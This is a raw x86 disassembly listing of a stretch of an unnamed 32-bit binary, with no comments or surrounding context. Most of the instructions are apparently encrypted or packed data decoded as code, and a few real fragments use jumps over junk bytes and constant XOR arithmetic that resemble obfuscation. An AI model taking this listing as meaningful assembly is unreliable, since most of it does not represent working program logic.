  410726:	inc    esp
  410727:	jmp    0x200554b5
  41072c:	popf   
  41072d:	mov    ds:0x8367d504,eax
  410732:	bound  edi,QWORD PTR [eax]
  410734:	lods   eax,DWORD PTR ds:[esi]
  410735:	push   eax
  410736:	aaa    
  410737:	ins    DWORD PTR es:[edi],dx
  410738:	dec    ecx
  410739:	sub    eax,0x57ee365f
  41073e:	fsubr  QWORD PTR [edi-0x5a6bf50e]
  410744:	pushw  0xffc2
  410747:	jmp    0x5ac2:0xfd94e753
  41074e:	stos   DWORD PTR es:[edi],eax
  41074f:	stos   BYTE PTR es:[edi],al
  410750:	and    BYTE PTR [edi+0x70],bh
  410753:	pop    ss
  410754:	jge    0x41075d
  410756:	mov    ch,0xb3
  410758:	xchg   ebp,eax
  410759:	mov    eax,0xf801bcc5
  41075e:	and    eax,0x3e957990
  410763:	pop    eax
  410764:	inc    ebx
  410765:	hlt    
  410766:	rcl    BYTE PTR [ebx-0x5d],0x9f
  41076a:	lock popf 
  41076c:	and    eax,DWORD PTR [edx+ebp*4]
  41076f:	outs   dx,BYTE PTR ds:[esi]
  410770:	mov    ds:0xf676fdb1,al
  410775:	xlat   BYTE PTR ds:[ebx]
  410776:	imul   DWORD PTR [edi+0x4b]
  410779:	mov    ebx,0x59022d32
  41077e:	cmp    eax,0x34e10a7f
  410783:	mov    WORD PTR [ebp-0x29],es
  410786:	or     DWORD PTR [ebx-0x267ef78b],0x26
  41078d:	das    
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	rol    edi,cl
  4107aa:	add    BYTE PTR [ebx+ecx*4-0x5c8f8fba],al
  4107b1:	jge    0x410823
  4107b3:	jo     0x4107a1
  4107b5:	enter  0x168c,0x51
  4107b9:	nop
  4107ba:	inc    esi
  4107bb:	ins    DWORD PTR es:[edi],dx
  4107bc:	add    DWORD PTR [ebp-0xa97afb8],esi
  4107c2:	pop    ds
  4107c3:	out    dx,eax
  4107c4:	dec    edx
  4107c5:	ror    eax,1
  4107c7:	add    al,0xb0
  4107c9:	cli    
  4107ca:	mov    ss,WORD PTR [ebp+0x1bf656f8]
  4107d0:	push   ebp
  4107d1:	test   eax,0x766f0f21
  4107d6:	repnz or al,ch
  4107d9:	sbb    DWORD PTR [ecx-0x26],edi
  4107dc:	sub    cl,BYTE PTR [edi+ebp*1]
  4107df:	das    
  4107e0:	jge    0x4107cc
  4107e2:	in     eax,0x90
  4107e4:	sub    ebp,DWORD PTR [edi+edx*1+0x4a68a01b]
  4107eb:	push   ebx
  4107ec:	xor    ebp,0x192bab83
  4107f2:	imul   BYTE PTR [ebp-0x2b0adf32]
  4107f8:	mov    edx,0x532240a
  4107fd:	xchg   edi,eax
  4107fe:	sbb    al,0xfb
  410800:	test   BYTE PTR [edx+ebx*4],bh
  410803:	daa    
  410804:	push   eax
  410805:	mov    eax,ds:0x7abe7ef2
  41080a:	inc    ebp
  41080b:	mov    al,0x17
  41080d:	pusha  
  41080e:	leave  
  41080f:	cmp    BYTE PTR [edi+0x7ce92ef1],bl
  410815:	in     eax,dx
  410816:	mov    edx,0x1c60cadf
  41081b:	sub    esp,esp
  41081d:	xor    al,0x8b
  41081f:	sbb    BYTE PTR [esi+esi*8],bh
  410822:	(bad)  
  410823:	fdivr  st,st(0)
  410825:	ss cli 
  410827:	jae    0x410844
  410829:	and    DWORD PTR [edx-0x551f96b7],edi
  41082f:	aaa    
  410830:	mov    dh,0xac
  410832:	dec    esi
  410833:	sbb    BYTE PTR [eax-0x1a],bl
  410836:	int    0xcf
  410838:	adc    eax,esp
  41083a:	stos   BYTE PTR es:[edi],al
  41083b:	pop    es
  41083c:	fiadd  WORD PTR [edx]
  41083e:	mov    dh,dl
  410840:	stc    
  410841:	xchg   ebp,eax
  410842:	sub    eax,0x6a8682d0
  410847:	outs   dx,BYTE PTR ds:[esi]
  410848:	pop    ss
  410849:	jge    0x4107e7
  41084b:	icebp  
  41084c:	retf   
  41084d:	(bad)  
  41084e:	xchg   edx,eax
  41084f:	cmp    BYTE PTR [ebp+0x556f2889],dl
  410855:	ret    0xc143
  410858:	faddp  st(4),st
  41085a:	push   ds
  41085b:	jae    0x410819
  41085d:	ins    BYTE PTR es:[edi],dx
  41085e:	dec    ebp
  41085f:	fwait
  410860:	and    al,0xc
  410862:	cld    
  410863:	ja     0x410847
  410865:	aas    
  410866:	ss push es
  410868:	loope  0x410832
  41086a:	mov    ?,WORD PTR [ebp-0xf]
  41086d:	or     DWORD PTR [ebx-0x10],edx
  410870:	sbb    esp,esi
  410872:	mov    dh,0x39
  410874:	retf   0xfc9f
  410877:	mul    BYTE PTR [ebp-0x18]
  41087a:	jmp    0x41086f
  41087c:	fdivr  QWORD PTR [edi-0x7c2bec5c]
  410882:	adc    al,0xa
  410884:	cmp    bl,BYTE PTR [edi+0x5628e894]
  41088a:	xor    BYTE PTR [edi+eax*8-0x4c],dh
  41088e:	lea    ebx,[edx]
  410890:	dec    esp
  410891:	retf   0xa1f3
  410894:	mov    al,BYTE PTR [ebx+0x2f]
  410897:	xor    edx,eax
  410899:	cmp    BYTE PTR [edi+edx*1],al
  41089c:	push   esi
  41089d:	popa   
  41089e:	adc    bh,BYTE PTR [ecx+eax*8-0x2b]
  4108a2:	call   0xdc02af68
  4108a7:	fidiv  WORD PTR [edx]
  4108a9:	gs inc esi
  4108ab:	jae    0x4108c2
  4108ad:	push   0xffffffb6
  4108af:	mov    esp,0xc847cad3
  4108b4:	mov    al,0x9c
  4108b6:	ss cs popf 
  4108b9:	fstp   TBYTE PTR [ebx]
  4108bb:	add    DWORD PTR ds:[ebx],ebp
  4108be:	jbe    0x4108b3
  4108c0:	cli    
  4108c1:	in     al,0xb2
  4108c3:	push   edi
  4108c4:	xchg   edi,eax
  4108c5:	xchg   edx,eax
  4108c6:	push   0x23
  4108c8:	gs in  al,dx
  4108ca:	and    BYTE PTR [edx],0x71
  4108cd:	aaa    
  4108ce:	cmp    edi,DWORD PTR [eax+0x43]
  4108d1:	lods   eax,DWORD PTR ds:[esi]
  4108d2:	cmp    al,0x77
  4108d4:	cs mov ah,0x3b
  4108d7:	sub    dh,0x93
  4108da:	and    edi,DWORD PTR [edx]
  4108dc:	dec    ecx
  4108dd:	sub    DWORD PTR [ebp-0x9],edi
  4108e0:	inc    esi
  4108e1:	(bad)  
  4108e2:	and    ah,dl
  4108e4:	leave  
  4108e5:	xchg   esp,eax
  4108e6:	out    0x18,al
  4108e8:	fst    QWORD PTR [esi]
  4108ea:	xor    eax,DWORD PTR [esi]
  4108ec:	(bad)  
  4108ed:	mov    bh,0xb5
  4108ef:	retf   0x55bd
  4108f2:	test   eax,0x67779604
  4108f7:	lods   eax,DWORD PTR ds:[esi]
  4108f8:	jp     0x410924
  4108fa:	(bad)  
  4108fb:	jne    0x4108e2
  4108fd:	pop    edx
  4108fe:	leave  
  4108ff:	rcr    BYTE PTR [ebp+0x6e9c0ffb],0xb2
  410906:	fnsave [esi-0x116b5873]
  41090c:	add    al,0x9f
  41090e:	aam    0xe9
  410910:	outs   dx,BYTE PTR ds:[esi]
  410911:	aaa    
  410912:	repnz mov al,0x75
  410915:	push   esi
  410916:	jmp    0xc0d:0x490beb02
  41091d:	jns    0x41092c
  41091f:	add    edx,DWORD PTR ds:0x23eda331
  410925:	loop   0x410934
  410927:	mov    al,0xa7
  410929:	sahf   
  41092a:	je     0x4108d6
  41092c:	js     0x4108ef
  41092e:	xchg   edx,eax
  41092f:	stc    
  410930:	aad    0xa0
  410932:	push   0x77b4e3a7
  410937:	mov    edi,0x471e54f
  41093c:	mov    dl,0xfc
  41093e:	jl     0x4109a9
  410940:	scas   eax,DWORD PTR es:[edi]
  410941:	(bad)  
  410942:	xor    esi,DWORD PTR [ebp-0x54aac771]
  410948:	xchg   ebx,eax
  410949:	pop    esp
  41094a:	jp     0x41093c
  41094c:	xchg   BYTE PTR [edx+esi*4-0x23],bl
  410950:	inc    ecx
  410951:	jbe    0x4108da
  410953:	and    ebx,DWORD PTR [edi-0x4e]
  410956:	push   ss
  410957:	jo     0x410915
  410959:	push   0x3d
  41095b:	mov    al,0xf2
  41095d:	jmp    0x41098d
  41095f:	fistp  DWORD PTR [esi-0x775c1a22]
  410965:	adc    esi,ecx
  410967:	dec    ebx
  410968:	aad    0xb9
  41096a:	xchg   esp,eax
  41096b:	xchg   ebp,eax
  41096c:	adc    edx,0x23
  41096f:	hlt    
  410970:	fs imul ebp,edi,0xd433c381
  410977:	mov    dl,0x52
  410979:	ret    
  41097a:	jecxz  0x41092a
  41097c:	clc    
  41097d:	sbb    al,0x31
  41097f:	or     DWORD PTR [ebx-0x70],esp
  410982:	pusha  
  410983:	sar    BYTE PTR [eax-0x48],cl
  410986:	add    ebp,DWORD PTR [eax+0x70]
  410989:	cmp    al,0x32
  41098b:	sub    al,0xa6
  41098e:	xchg   esp,eax
  41098f:	adc    al,0xf6
  410991:	jp     0x4109bd
  410993:	int    0xa7
  410995:	(bad)  
  410996:	ss add eax,0xf647a834
  41099c:	pop    edx
  41099d:	cs in  al,dx
  41099f:	dec    esp
  4109a0:	sahf   
  4109a1:	lahf   
  4109a2:	addr16 sub eax,0xc6aeaec0
  4109a8:	cmp    eax,0xc84f1057
  4109ad:	xor    ecx,DWORD PTR [esi+0x4f115baf]
  4109b3:	ja     0x41099e
  4109b5:	mov    bl,BYTE PTR [eax-0x4941dde]
  4109bb:	push   ss
  4109bc:	push   ecx
  4109bd:	mov    cl,0xa
  4109bf:	sti    
  4109c0:	es jnp 0x410a0a
  4109c3:	xchg   esp,eax
  4109c4:	pop    eax
  4109c5:	and    eax,0xea6ae63e
  4109ca:	push   0xffffff84
  4109cc:	and    ecx,DWORD PTR [edx+0x6691c5c6]
  4109d2:	add    ch,BYTE PTR [edx-0x5c5ed56e]
  4109d8:	push   cs
  4109d9:	mov    ch,0xa5
  4109db:	cmp    ebp,DWORD PTR [ecx-0x5a]
  4109de:	sbb    eax,0x772cc138
  4109e3:	(bad)  
  4109e4:	jns    0x410a64
  4109e6:	je     0x4109b2
  4109e8:	ror    esi,1
  4109ea:	fdivr  DWORD PTR [ecx+0x33d803a5]
  4109f0:	pop    ss
  4109f1:	xchg   edx,eax
  4109f2:	js     0x4109e7
  4109f4:	cmp    DWORD PTR [ebx-0x50],edi
  4109f7:	cmp    esp,ecx
  4109f9:	add    esi,DWORD PTR [eax]
  4109fb:	and    bl,bl
  4109fd:	dec    eax
  4109fe:	sti    
  4109ff:	push   cs
  410a00:	adc    ch,0xef
  410a03:	out    dx,eax
  410a04:	cmp    BYTE PTR [ebx+ecx*4+0x58],al
  410a08:	xor    DWORD PTR [edx+eax*4+0x78adebb4],edx
  410a0f:	mov    ecx,0x5f0c6231
  410a14:	xor    esi,DWORD PTR [ebx+0x19]
  410a17:	imul   esi,DWORD PTR [ebp+0x2f],0xa65d53c8
  410a1e:	add    al,0xb1
  410a20:	and    eax,0xef3439e2
  410a25:	psubq  mm6,QWORD PTR [edi-0x46]
  410a29:	retf   0x5305
  410a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a2d:	(bad)  
  410a2e:	fisub  DWORD PTR [eax]
  410a30:	xor    edi,edx
  410a32:	xor    eax,0x1c5b39c5
  410a37:	div    DWORD PTR [ecx-0x4beab1eb]
  410a3d:	cmp    DWORD PTR [ecx],edi
  410a3f:	mov    fs,WORD PTR [edi-0xf]
  410a42:	leave  
  410a43:	pop    ebx
  410a44:	pop    ebx
  410a45:	psadbw mm1,QWORD PTR [edi+0x16]
  410a49:	jbe    0x410a1f
  410a4b:	pop    es
  410a4c:	gs loop 0x410a92
  410a4f:	jp     0x410a22
  410a51:	sub    BYTE PTR [ebx-0x79],cl
  410a54:	mov    BYTE PTR [ecx+0x69d57d08],ch
  410a5a:	mov    fs,ebp
  410a5c:	adc    bh,BYTE PTR [ecx+0x2605c0ef]
  410a62:	xchg   ebp,eax
  410a63:	xor    al,0x14
  410a65:	add    DWORD PTR [ebp-0x48],ecx
  410a68:	sbb    eax,0x9defe48a
  410a6d:	fiadd  DWORD PTR [esi-0x2e]
  410a70:	ja     0x410a23
  410a72:	retf   
  410a73:	mov    ds:0x3a942b5a,al
  410a78:	popa   
  410a79:	jle    0x410a74
  410a7b:	xchg   edi,eax
  410a7c:	or     DWORD PTR ds:[esi-0x6a5815f7],0x1e
  410a84:	jg     0x410a2e
  410a86:	push   eax
  410a87:	add    BYTE PTR [ebp+0x7628756c],ch
  410a8d:	repnz inc cx
  410a90:	dec    ebx
  410a91:	test   BYTE PTR [eax+0x64],0xd6
  410a95:	jb     0x410a19
  410a97:	jp     0x410a1d
  410a99:	ror    DWORD PTR [esi+ecx*2+0x34381ee9],0x5e
  410aa1:	push   ecx
  410aa2:	daa    
  410aa3:	aam    0xf5
  410aa5:	mov    esp,0x6296341
  410aaa:	dec    eax
  410aab:	push   ds
  410aac:	mov    ecx,0xd890e58f
  410ab1:	mov    eax,ds:0xc0a1eb2e
  410ab6:	call   0x3dbb:0xb36cf94f
  410abd:	int3   
  410abe:	mov    WORD PTR [edx],gs
  410ac0:	push   edi
  410ac1:	mov    eax,ds:0xe22a96d9
  410ac6:	daa    
  410ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac8:	and    dh,al
  410aca:	sub    BYTE PTR [ecx+ecx*8-0x69],bh
  410ace:	xor    dl,BYTE PTR [esi+0x168b34a8]
  410ad4:	stos   BYTE PTR es:[edi],al
  410ad5:	sbb    ah,ah
  410ad7:	ins    DWORD PTR es:[edi],dx
  410ad8:	iret   
  410ad9:	stc    
  410ada:	iret   
  410adb:	and    edx,DWORD PTR [esi-0x6118f17d]
  410ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae2:	mov    esp,0xf93b729a
  410ae7:	fsubr  DWORD PTR [esi-0x275d815b]
  410aed:	push   0x321deceb
  410af2:	arpl   WORD PTR [ebp+0x7f],di
  410af5:	sbb    ah,dl
  410af7:	adc    eax,0xbf100f74
  410afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410afe:	scas   eax,DWORD PTR es:[edi]
  410aff:	dec    edi
  410b00:	push   ss
  410b01:	sbb    BYTE PTR [edx],bl
  410b03:	sub    al,0xcf
  410b05:	push   ss
  410b06:	dec    eax
  410b07:	pop    ds
  410b08:	push   ebx
  410b09:	jl     0x410af8
  410b0b:	mov    al,0x8b
  410b0d:	inc    edx
  410b0e:	pop    ss
  410b0f:	data16 mov ds:0x80aea7ba,al
  410b15:	fs inc ebp
  410b17:	push   esi
  410b18:	dec    al
  410b1a:	ret    
  410b1b:	clc    
  410b1c:	test   BYTE PTR [ecx],cl
  410b1e:	cmp    al,0x71
  410b20:	stc    
  410b21:	int    0x1e
  410b23:	xchg   ecx,eax
  410b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b25:	cmp    al,0xa2
  410b27:	jne    0x410ac9
  410b29:	mov    ch,0xb4
  410b2b:	scas   eax,DWORD PTR es:[edi]
  410b2c:	lahf   
  410b2d:	inc    ecx
  410b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b2f:	je     0x410b40
  410b31:	mov    esp,0x513a9726
  410b36:	repnz xchg dl,al
  410b39:	or     ch,dh
  410b3b:	addr16 icebp 
  410b3d:	cmc    
  410b3e:	(bad)  
  410b40:	jp     0x410ba4
  410b42:	jb     0x410b69
  410b44:	cdq    
  410b45:	dec    eax
  410b46:	cld    
  410b47:	and    esi,DWORD PTR [ebx]
  410b49:	pop    es
  410b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b4b:	bound  ebx,QWORD PTR [ebp+0x58]
  410b4e:	daa    
  410b4f:	ret    0x2b55
  410b52:	push   eax
  410b53:	pop    eax
  410b54:	in     eax,0xce
  410b56:	imul   eax,edx,0x63ac49de
  410b5c:	xchg   ebx,eax
  410b5d:	xor    eax,0x390430e3
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz cmp BYTE PTR gs:[esi+0x70423e1c],dl
  410bab:	jo     0x410c05
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c17
  410bb1:	xor    DWORD PTR [edx],esp
  410bb3:	fldcw  WORD PTR [ecx]
  410bb5:	dec    eax
  410bb6:	cmp    al,dh
  410bb8:	push   edx
  410bb9:	js     0x410bd3
  410bbb:	jp     0x410b70
  410bbd:	jne    0x410b6c
  410bbf:	int    0x2e
  410bc1:	lahf   
  410bc2:	into   
  410bc3:	dec    esi
  410bc4:	in     al,dx
  410bc5:	cmp    DWORD PTR [edx-0x6ab90c67],eax
  410bcb:	dec    ecx
  410bcc:	add    eax,0xca325524
  410bd1:	gs popf 
  410bd3:	aam    0x5c
  410bd5:	sahf   
  410bd6:	loopne 0x410bfe
  410bd8:	nop
  410bd9:	idiv   BYTE PTR [ecx]
  410bdb:	aam    0xe0
  410bdd:	sub    dl,bl
  410bdf:	push   ebp
  410be0:	dec    eax
  410be1:	cdq    
  410be2:	sbb    DWORD PTR [edi-0x67f54d83],ebx
  410be8:	push   edi
  410be9:	ss cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  410bec:	jle    0x410bbd
  410bee:	pop    ss
  410bef:	ret    0x41da
  410bf2:	fs jge 0x410c00
  410bf5:	jle    0x410be8
  410bf7:	into   
  410bf8:	dec    edi
  410bf9:	sti    
  410bfa:	mov    ds:0x63d6cc04,eax
  410bff:	mov    ds:0x3a659256,eax
  410c04:	push   ss
  410c05:	inc    edx
  410c06:	inc    ebp
  410c07:	jno    0x410c5f
  410c09:	int    0xd2
  410c0b:	pop    esp
  410c0c:	ret    0xf94d
  410c0f:	xchg   esi,eax
  410c10:	dec    edx
  410c11:	outs   dx,BYTE PTR ds:[esi]
  410c12:	cmp    eax,0x8fe45f6d
  410c17:	fsub   st(5),st
  410c19:	inc    edx
  410c1a:	aam    0xf8
  410c1c:	push   esp
  410c1d:	enter  0x654c,0xd9
  410c21:	pushf  
  410c22:	mov    BYTE PTR [ebp+0x3b],dh
  410c25:	mov    ?,WORD PTR [ecx]
  410c27:	outs   dx,BYTE PTR ds:[esi]
  410c28:	or     eax,0x31c7d646
  410c2d:	xchg   edi,eax
  410c2e:	jecxz  0x410c81
  410c30:	loopne 0x410bbb
  410c32:	repz adc ebp,DWORD PTR [ebx+ebx*4-0x1eb8e4b5]
  410c3a:	or     ah,BYTE PTR [eax]
  410c3c:	in     eax,dx
  410c3d:	xlat   BYTE PTR ds:[ebx]
  410c3e:	xor    bl,BYTE PTR [edx]
  410c40:	jecxz  0x410c56
  410c42:	mov    fs,ebp
  410c44:	ficom  DWORD PTR [esi+0x4b]
  410c47:	push   ss
  410c48:	fdiv   DWORD PTR [edx-0x479a8234]
  410c4e:	loop   0x410c8a
  410c50:	popa   
  410c51:	and    eax,0x82112e80
  410c56:	sub    dl,0x6a
  410c59:	push   0xffffffbe
  410c5b:	inc    ecx
  410c5c:	mov    al,ds:0x7c1e297b
  410c61:	jbe    0x410c5b
  410c63:	inc    edx
  410c64:	int    0xa5
  410c66:	pop    eax
  410c67:	push   eax
  410c68:	pop    edx
  410c69:	mov    cl,0x61
  410c6b:	sahf   
  410c6c:	icebp  
  410c6d:	fcmovu st,st(0)
  410c6f:	jae    0x410bfe
  410c71:	dec    esi
  410c72:	xchg   esp,eax
  410c73:	push   ss
  410c74:	xor    esp,ecx
  410c76:	in     eax,dx
  410c77:	in     eax,dx
  410c78:	add    BYTE PTR [edx-0x589342a5],dh
  410c7e:	sbb    DWORD PTR [eax+0x15],ecx
  410c81:	mov    esp,0x5c55e53a
  410c86:	dec    ebp
  410c87:	int3   
  410c88:	add    edi,DWORD PTR [edx]
  410c8a:	std    
  410c8b:	lods   al,BYTE PTR ds:[esi]
  410c8c:	hlt    
  410c8d:	jo     0x410c86
  410c8f:	ret    
  410c90:	inc    esi
  410c91:	add    eax,0x91260dd1
  410c96:	inc    esi
  410c97:	sbb    al,0x83
  410c99:	mov    ebp,0xe714df91
  410c9e:	ficom  DWORD PTR [ebx+0x4c9f02d1]
  410ca4:	sub    eax,0x74452fc6
  410ca9:	rol    DWORD PTR [ebp-0x32],1
  410cac:	add    ebx,eax
  410cae:	imul   esi,DWORD PTR [ecx-0x7a0aab63],0x648bfc1f
  410cb8:	pop    esp
  410cb9:	cmp    al,BYTE PTR [ebp-0x23fd418]
  410cbf:	adc    bh,ch
  410cc1:	daa    
  410cc2:	and    DWORD PTR [edi],0xffffff90
  410cc5:	int3   
  410cc6:	das    
  410cc7:	or     edi,eax
  410cc9:	inc    DWORD PTR [ebp-0x3b]
  410ccc:	jecxz  0x410d2f
  410cce:	push   esi
  410ccf:	pop    ds
  410cd0:	data16 add BYTE PTR [ebx-0x6259cbcf],cl
  410cd7:	mov    BYTE PTR [ecx+0x5e],dl
  410cda:	mov    BYTE PTR [edx+0x50],0x8c
  410cde:	fs ret 0x42e1
  410ce2:	xor    bl,al
  410ce4:	ret    0x92e6
  410ce7:	cwde   
  410ce8:	jmp    0x56f57592
  410ced:	daa    
  410cee:	pushf  
  410cef:	xlat   BYTE PTR ds:[ebx]
  410cf0:	xor    bh,cl
  410cf2:	jl     0x410d55
  410cf4:	data16 fdivrp st(1),st
  410cf7:	and    dh,bh
  410cf9:	cwde   
  410cfa:	jle    0x410cca
  410cfc:	mov    dh,0x29
  410cfe:	fnstsw WORD PTR [ebx+0x47292cbe]
  410d04:	je     0x410d33
  410d06:	aam    0xc
  410d08:	pop    edx
  410d09:	pop    ebp
  410d0a:	cs jp  0x410d09
  410d0d:	sub    dh,bh
  410d0f:	xchg   DWORD PTR [bp+si+0x1a],esp
  410d13:	sub    al,0x19
  410d15:	push   esi
  410d16:	mov    eax,ds:0x7bdd5815
  410d1b:	rol    DWORD PTR ds:[edx+0x4c],cl
  410d1f:	repnz add eax,0x26e0eaf6
  410d25:	sti    
  410d26:	jnp    0x410d23
  410d28:	adc    ebp,0x38
  410d2b:	(bad)  
  410d2c:	or     esp,ebx
  410d2e:	test   ah,bl
  410d30:	jmp    DWORD PTR [eax+0x5d]
  410d33:	push   0x198b9280
  410d38:	pushf  
  410d39:	mov    BYTE PTR [ebp+0x78],0xff
  410d3d:	sub    edx,DWORD PTR [ebp+0x3ec80531]
  410d43:	in     al,dx
  410d44:	scas   eax,DWORD PTR es:[edi]
  410d45:	loopne 0x410da9
  410d47:	mov    edi,0x1f386ba8
  410d4c:	(bad)  
  410d4d:	jns    0x410d51
  410d4f:	call   0x882b0278
  410d54:	test   eax,0xd423b53e
  410d59:	loop   0x410d8d
  410d5b:	dec    ebp
  410d5c:	lods   al,BYTE PTR ds:[esi]
  410d5d:	mov    esp,0x21a706a4
  410d62:	fimul  WORD PTR [edi-0x7b]
  410d65:	mov    esp,0x51f6df79
  410d6a:	and    dh,BYTE PTR [esi]
  410d6c:	retf   
  410d6d:	test   BYTE PTR [eax+esi*8+0x53],0xb6
  410d72:	push   eax
  410d73:	cmp    esp,DWORD PTR [ebx]
  410d75:	mov    cl,0x39
  410d77:	inc    ebp
  410d78:	push   edx
  410d79:	lods   al,BYTE PTR ds:[esi]
  410d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d7b:	ret    
  410d7c:	adc    DWORD PTR ds:[edi-0x2b],edx
  410d80:	add    al,0xb
  410d82:	dec    edx
  410d83:	pop    ds
  410d84:	mov    ch,BYTE PTR [edi+0x12]
  410d87:	adc    eax,0x74b4d59
  410d8c:	mov    dh,0x4f
  410d8e:	mov    ds:0xec393148,al
  410d93:	or     al,dl
  410d95:	call   0xfb58:0xfc225d69
  410d9c:	lock pop edi
  410d9e:	enter  0xf3bd,0xa0
  410da2:	test   ebx,esp
  410da4:	mov    ecx,0xe1ccb63d
  410da9:	mov    dl,0x1c
  410dab:	mov    ebx,0x62b70345
  410db0:	aad    0xed
  410db2:	cmp    al,0xcb
  410db4:	push   eax
  410db5:	lds    ecx,FWORD PTR [ebx+0x5be13751]
  410dbb:	test   DWORD PTR [ebx],0x6e24fa3b
  410dc1:	addr16 jmp 0x410d9a
  410dc4:	out    dx,eax
  410dc5:	add    al,0x4c
  410dc7:	xlat   BYTE PTR ds:[ebx]
  410dc8:	push   edx
  410dc9:	and    ebx,0x9a00e7ab
  410dcf:	xlat   BYTE PTR ds:[ebx]
  410dd0:	outs   dx,BYTE PTR ds:[esi]
  410dd1:	cmc    
  410dd2:	in     al,dx
  410dd3:	(bad)  
  410dd4:	xor    bh,BYTE PTR [ebp+0x42]
  410dd7:	pushf  
  410dd8:	pop    ss
  410dd9:	mov    ss,WORD PTR [edi+0x1f355778]
  410ddf:	inc    esi
  410de0:	sar    BYTE PTR [ecx-0x5d],cl
  410de3:	jl     0x410e29
  410de5:	call   0xef05:0x9747faec
  410dec:	xor    al,BYTE PTR [ecx]
  410dee:	repnz out dx,eax
  410df0:	je     0x410d93
  410df2:	bound  edx,QWORD PTR [eax-0x77]
  410df5:	(bad)  
  410df6:	adc    DWORD PTR [ebx-0x32],ecx
  410df9:	dec    edx
  410dfa:	gs hlt 
  410dfc:	mov    ah,0x80
  410dfe:	xlat   BYTE PTR ds:[ebx]
  410dff:	pop    ebp
  410e00:	or     DWORD PTR [ebp-0x6e],0xdca9a46c
  410e07:	inc    eax
  410e08:	lods   eax,DWORD PTR ds:[esi]
  410e09:	(bad)  [esi+0x24]
  410e0c:	in     al,dx
  410e0d:	add    ch,bh
  410e0f:	xor    ch,BYTE PTR [eax-0x540c900e]
  410e15:	lds    eax,FWORD PTR [ebp+0x27a751b2]
  410e1b:	lods   eax,DWORD PTR ds:[esi]
  410e1c:	xor    DWORD PTR [ebx-0x5d02f357],ebx
  410e22:	push   esi
  410e23:	loop   0x410e9b
  410e25:	cmp    ah,bh
  410e27:	xor    BYTE PTR [eax+0x67],0x31
  410e2b:	sti    
  410e2c:	(bad)  
  410e2d:	mov    eax,0xa8a820df
  410e32:	rol    DWORD PTR [ebx+edx*1-0x61],cl
  410e36:	call   0x5380:0xbb389c90
  410e3d:	or     eax,0xa0fcad6f
  410e42:	in     al,0x17
  410e44:	xchg   ecx,eax
  410e45:	xchg   edi,eax
  410e46:	push   es
  410e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e48:	lods   al,BYTE PTR ds:[esi]
  410e49:	sbb    BYTE PTR [ebx+0x59],ch
  410e4c:	in     al,0x34
  410e4e:	shl    DWORD PTR [eax],0xb9
  410e51:	xor    DWORD PTR [eax+0x12],ecx
  410e54:	gs push cs
  410e56:	cmp    al,0xe4
  410e58:	add    al,BYTE PTR [ebx]
  410e5a:	adc    DWORD PTR [edx],ecx
  410e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e5d:	call   0xf973a338
  410e62:	int    0x26
  410e64:	push   esi
  410e65:	xchg   dl,bl
  410e67:	sbb    al,0x42
  410e69:	(bad)  
  410e6a:	adc    eax,0x2354dc6b
  410e6f:	cs push ecx
  410e71:	mov    ah,0xc0
  410e73:	xchg   esi,eax
  410e74:	out    dx,eax
  410e75:	sbb    eax,0x9d3301e2
  410e7a:	shl    BYTE PTR [edi],0x62
  410e7d:	lea    edx,[edi]
  410e7f:	mov    ah,0xd0
  410e81:	jnp    0x410e94
  410e83:	jmp    0x410e8d
  410e85:	shl    BYTE PTR [ebp+0x44],cl
  410e88:	test   BYTE PTR [esi-0x21],ah
  410e8b:	adc    eax,0x7d0045e1
  410e90:	pop    edx
  410e91:	popa   
  410e92:	pushf  
  410e93:	jmp    0x410eef
  410e95:	and    ecx,DWORD PTR [eax-0x50b920b9]
  410e9b:	ror    ch,cl
  410e9d:	push   0xffffffdb
  410e9f:	fwait
  410ea0:	and    cl,BYTE PTR [ecx]
  410ea2:	pop    edx
  410ea3:	ds popa 
  410ea5:	or     al,0x6a
  410ea7:	mov    ebp,0xa5569c23
  410eac:	mov    WORD PTR [eax+0x4e],es
  410eaf:	test   al,0x58
  410eb1:	push   ds
  410eb2:	dec    edx
  410eb3:	pop    ss
  410eb4:	mov    esi,0xbd9a49d1
  410eb9:	call   0x69114eb0
  410ebe:	test   ebp,ecx
  410ec0:	addr16 out dx,al
  410ec2:	pop    eax
  410ec3:	icebp  
  410ec4:	loopne 0x410e46
  410ec6:	rol    BYTE PTR [edx],0x42
  410ec9:	pop    esp
  410eca:	mov    dl,0x78
  410ecc:	adc    ebp,esp
  410ece:	mov    ch,0x8
  410ed0:	call   0xc0186bb6
  410ed5:	cmp    eax,0xec13396a
  410eda:	or     BYTE PTR [ebx-0x7],ch
  410edd:	jl     0x410e73
